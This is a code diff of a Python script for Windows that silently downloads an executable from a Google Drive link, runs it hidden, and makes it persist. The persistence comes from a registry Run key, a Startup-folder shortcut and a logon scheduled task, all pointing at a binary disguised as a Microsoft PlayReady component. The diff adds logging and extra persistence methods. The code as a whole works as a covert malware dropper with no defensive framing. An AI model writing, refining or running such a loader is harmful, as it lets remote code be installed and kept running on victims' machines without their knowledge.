@@ -4,16 +4,20 @@ import os
 import time
 import winreg
 from pathlib import Path
+import shutil
 
 GDOWN_DRIVE_ID = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n"
 OUTPUT_NAME = "downloaded_file.exe"
+LOG_FILE = Path(os.environ.get("TEMP", "")) / "persist_log.txt"
 
-# Final expected path after the exe self‑installs
-FINAL_EXE_LOCAL = Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "PlayReady" / "dbengin.exe"
-FINAL_EXE_ROAMING = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "PlayReady" / "dbengin.exe"
+def log(msg):
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")
+    except:
+        pass
 
 def run_hidden(cmd, wait=False):
-    """Run a command with no visible window."""
     creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
     if wait:
         return subprocess.run(cmd, creationflags=creationflags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -21,83 +25,114 @@ def run_hidden(cmd, wait=False):
         return subprocess.Popen(cmd, creationflags=creationflags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
 def set_autorun_registry(exe_path: Path):
-    """Add the executable to HKCU\Software\Microsoft\Windows\CurrentVersion\Run."""
+    """Set HKCU Run entry and verify."""
     try:
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE) as key:
             winreg.SetValueEx(key, "UserAppStartup", 0, winreg.REG_SZ, str(exe_path))
-    except Exception:
-        pass  # silent
+            # Verify
+            value, _ = winreg.QueryValueEx(key, "UserAppStartup")
+            if value == str(exe_path):
+                log("Registry entry set successfully.")
+            else:
+                log(f"Registry verification failed: expected {exe_path}, got {value}")
+    except Exception as e:
+        log(f"Registry error: {e}")
 
-def create_scheduled_task(exe_path: Path):
-    """Create a daily scheduled task (non‑elevated) for persistence."""
-    task_name = "dbengin"
-    trigger_time = "09:00"  # daily at 9 AM
-    ps_script = f"""
+def add_to_startup_folder(exe_path: Path):
+    """Copy a shortcut to the user's Startup folder."""
+    try:
+        startup = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+        startup.mkdir(parents=True, exist_ok=True)
+        shortcut_path = startup / "UserAppStartup.lnk"
+        # Create shortcut using PowerShell (more reliable)
+        ps_script = f'''
+        $WshShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
+        $Shortcut.TargetPath = "{exe_path}"
+        $Shortcut.Save()
+        '''
+        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
+                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        log(f"Startup shortcut created at {shortcut_path}")
+    except Exception as e:
+        log(f"Startup folder error: {e}")
+
+def create_logon_scheduled_task(exe_path: Path):
+    """Create a scheduled task that runs at user logon (not just daily)."""
+    task_name = "UserAppStartup"
+    ps_script = f'''
     $taskName = "{task_name}"
     $action = New-ScheduledTaskAction -Execute "{exe_path}"
-    $trigger = New-ScheduledTaskTrigger -Daily -At "{trigger_time}"
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
     $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
-    """
-    cmd = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
-    run_hidden(cmd, wait=True)
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
+    '''
+    try:
+        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
+                       capture_output=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        log("Scheduled task (logon) created successfully.")
+    except subprocess.CalledProcessError as e:
+        log(f"Scheduled task error: {e.stderr.decode() if e.stderr else 'unknown'}")
 
 def ensure_persistence():
-    """Locate the final .exe and set up persistence (registry + scheduled task)."""
-    # Wait a bit for the exe to finish self‑moving
+    """Locate final exe and apply all persistence methods."""
     final_path = None
-    for _ in range(10):  # up to 10 seconds
-        if FINAL_EXE_LOCAL.exists():
-            final_path = FINAL_EXE_LOCAL
-            break
-        if FINAL_EXE_ROAMING.exists():
-            final_path = FINAL_EXE_ROAMING
+    # Known possible locations
+    candidates = [
+        Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "PlayReady" / "dbengin.exe",
+        Path(os.environ.get("APPDATA", "")) / "Microsoft" / "PlayReady" / "dbengin.exe",
+        Path(OUTPUT_NAME).absolute()  # fallback to original download location
+    ]
+    for _ in range(20):  # wait up to 20 seconds
+        for p in candidates:
+            if p.exists():
+                final_path = p
+                break
+        if final_path:
             break
         time.sleep(1)
 
-    # If still missing, manually move the downloaded file into place
-    downloaded = Path(OUTPUT_NAME)
-    if not final_path and downloaded.exists():
-        try:
-            FINAL_EXE_LOCAL.parent.mkdir(parents=True, exist_ok=True)
-            downloaded.rename(FINAL_EXE_LOCAL)
-            final_path = FINAL_EXE_LOCAL
-        except Exception:
-            pass
+    if not final_path:
+        log("Final executable not found after waiting.")
+        return
 
-    if final_path and final_path.exists():
-        # 1. Registry autorun (HKCU Run)
-        set_autorun_registry(final_path)
-
-        # 2. Scheduled task (optional, but adds stealth)
-        create_scheduled_task(final_path)
+    log(f"Found final exe at {final_path}")
+    set_autorun_registry(final_path)
+    add_to_startup_folder(final_path)
+    create_logon_scheduled_task(final_path)
 
 def main():
     if sys.platform != "win32":
         return
 
+    log("=== Persistence script started ===")
     url = f"https://drive.google.com/uc?id={GDOWN_DRIVE_ID}"
     cmd = [sys.executable, "-m", "gdown", url, "-O", OUTPUT_NAME]
 
-    # Step 1: Download (wait for completion)
+    # Download
     try:
         run_hidden(cmd, wait=True)
-    except Exception:
+        log("Download completed.")
+    except Exception as e:
+        log(f"Download failed: {e}")
         return
 
-    # Step 2: Run the downloaded exe (wait for it to finish)
+    # Run the downloaded exe (allow it to self-install)
     exe_path = Path(OUTPUT_NAME)
     if not exe_path.exists():
+        log("Downloaded file missing after download.")
         return
     try:
         run_hidden([str(exe_path)], wait=True)
-    except Exception:
-        pass
+        log("Executed downloaded file (waited for it to finish).")
+    except Exception as e:
+        log(f"Execution error: {e}")
 
-    # Step 3: Set up persistence
+    # Set up persistence
     ensure_persistence()
+    log("=== Persistence script finished ===")
 
 if __name__ == "__main__":
     main()
